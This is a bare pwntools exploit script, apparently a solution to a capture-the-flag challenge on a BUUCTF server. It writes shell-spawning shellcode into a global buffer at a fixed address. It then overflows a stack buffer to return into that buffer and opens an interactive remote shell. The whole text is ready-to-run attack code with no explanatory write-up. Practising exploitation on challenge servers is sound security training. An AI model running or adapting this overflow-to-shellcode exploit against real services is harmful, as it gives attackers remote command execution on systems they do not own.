from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 28021)
bss_addr = 0x601080 # name
shellcode = asm(shellcraft.sh())
io.sendlineafter(b'tell me your name', shellcode)
payload = b'a'*(0x20+0x8) + p64(bss_addr)
io.sendlineafter(b'What do you want to say to me?', payload)
io.interactive()